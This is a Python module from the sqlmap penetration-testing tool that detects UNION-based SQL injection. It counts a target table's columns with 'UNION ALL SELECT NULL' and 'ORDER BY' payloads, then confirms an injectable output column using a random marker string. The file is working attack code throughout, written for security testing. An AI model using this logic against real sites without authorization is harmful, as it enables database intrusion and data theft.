#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.agent import agent
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.session import setUnion
from lib.core.unescaper import unescaper
from lib.parse.html import htmlParser
from lib.request.connect import Connect as Request

def __unionPosition(negative=False, falseCond=False):
    validPayload = None

    if negative or falseCond:
        negLogMsg = "partial (single entry)"
    else:
        negLogMsg = "full"

    infoMsg  = "confirming %s inband sql injection on parameter " % negLogMsg
    infoMsg += "'%s'" % kb.injParameter

    if negative:
        infoMsg += " with negative parameter value"
    elif falseCond:
        infoMsg += " by appending a false condition after the parameter value"

    logger.info(infoMsg)

    # For each column of the table (# of NULL) perform a request using
    # the UNION ALL SELECT statement to test it the target url is
    # affected by an exploitable inband SQL injection vulnerability
    for exprPosition in range(0, kb.unionCount):
        # Prepare expression with delimiters
        randQuery = randomStr()
        randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
        randQueryUnescaped = unescaper.unescape(randQueryProcessed)

        # Forge the inband SQL injection request
        query   = agent.forgeInbandQuery(randQueryUnescaped, exprPosition)
        payload = agent.payload(newValue=query, negative=negative, falseCond=falseCond)

        # Perform the request
        resultPage, _ = Request.queryPage(payload, content=True)

        # We have to assure that the randQuery value is not within the
        # HTML code of the result page because, for instance, it is there
        # when the query is wrong and the back-end DBMS is Microsoft SQL
        # server
        htmlParsed = htmlParser(resultPage)

        if resultPage and randQuery in resultPage and not htmlParsed:
            setUnion(position=exprPosition)
            validPayload = payload

            break

    if isinstance(kb.unionPosition, int):
        infoMsg  = "the target url is affected by an exploitable "
        infoMsg += "%s inband sql injection vulnerability " % negLogMsg
        infoMsg += "on parameter '%s'" % kb.injParameter
        logger.info(infoMsg)
    else:
        warnMsg  = "the target url is not affected by an exploitable "
        warnMsg += "%s inband sql injection vulnerability " % negLogMsg
        warnMsg += "on parameter '%s'" % kb.injParameter

        if negLogMsg == "partial":
            warnMsg += ", sqlmap will retrieve the query output "
            warnMsg += "through blind sql injection technique"

        logger.warn(warnMsg)

    return validPayload

def __unionConfirm(negative=False, falseCond=False):
    validPayload = None

    # Confirm the inband SQL injection and get the exact column
    # position which can be used to extract data
    if not isinstance(kb.unionPosition, int):
        validPayload = __unionPosition(negative=negative, falseCond=falseCond)

        # Assure that the above function found the exploitable full inband
        # SQL injection position
        if not isinstance(kb.unionPosition, int):
            validPayload = __unionPosition(negative=True)

            # Assure that the above function found the exploitable partial
            # (single entry) inband SQL injection position with negative
            # parameter validPayload
            if not isinstance(kb.unionPosition, int):
                validPayload = __unionPosition(falseCond=True)

                # Assure that the above function found the exploitable partial
                # (single entry) inband SQL injection position by appending
                # a false condition after the parameter validPayload
                if not isinstance(kb.unionPosition, int):
                    return
                else:
                    setUnion(falseCond=True)
            else:
                setUnion(negative=True)

    return validPayload

def __unionTestByNULLBruteforce(comment, negative=False, falseCond=False):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    columns = None
    query   = agent.prefixQuery("UNION ALL SELECT NULL")

    for count in range(0, 50):
        if kb.dbms == DBMS.ORACLE and query.endswith(" FROM DUAL"):
            query = query[:-len(" FROM DUAL")]

        if count:
            query += ", NULL"

        if kb.dbms == DBMS.ORACLE:
            query += " FROM DUAL"

        commentedQuery = agent.postfixQuery(query, comment)
        payload        = agent.payload(newValue=commentedQuery, negative=negative, falseCond=falseCond)
        seqMatcher     = Request.queryPage(payload, getSeqMatcher=True)

        if seqMatcher >= 0.6:
            columns = count + 1

            break

    return columns

def __unionTestByOrderBy(comment, negative=False, falseCond=False):
    columns     = None
    prevPayload = ""

    for count in range(1, 51):
        query        = agent.prefixQuery("ORDER BY %d" % count)
        orderByQuery = agent.postfixQuery(query, comment)
        payload      = agent.payload(newValue=orderByQuery, negative=negative, falseCond=falseCond)
        seqMatcher   = Request.queryPage(payload, getSeqMatcher=True)

        if seqMatcher >= 0.6:
            columns = count

        elif columns:
            break

        prevPayload = payload

    return columns

def __unionTestAll(comment="", negative=False, falseCond=False):
    columns = None

    if conf.uTech == "orderby":
        columns = __unionTestByOrderBy(comment, negative=negative, falseCond=falseCond)
    else:
        columns = __unionTestByNULLBruteforce(comment, negative=negative, falseCond=falseCond)

    return columns

def unionTest():
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    if conf.direct:
        return

    if kb.unionTest is not None:
        return kb.unionTest

    if conf.uTech == "orderby":
        technique = "ORDER BY clause bruteforcing"
    else:
        technique = "NULL bruteforcing"

    infoMsg  = "testing inband sql injection on parameter "
    infoMsg += "'%s' with %s technique" % (kb.injParameter, technique)
    logger.info(infoMsg)

    validPayload = None
    columns = None
    negative = False
    falseCond = False

    for comment in (queries[kb.dbms].comment.query, ""):
        columns = __unionTestAll(comment)

        if not columns:
            negative = True
            columns = __unionTestAll(comment, negative=negative)

        if not columns:
            falseCond = True
            columns = __unionTestAll(comment, falseCond=falseCond)

        if columns:
            setUnion(comment=comment, count=columns, negative=negative, falseCond=falseCond)

            break

    if kb.unionCount:
        validPayload = __unionConfirm(negative=negative, falseCond=falseCond)
    else:
        warnMsg  = "the target url is not affected by an "
        warnMsg += "inband sql injection vulnerability"
        logger.warn(warnMsg)

    if validPayload is None:
        validPayload = ""
    elif isinstance(validPayload, basestring):
        kb.unionTest = agent.removePayloadDelimiters(validPayload, False)

    return kb.unionTest
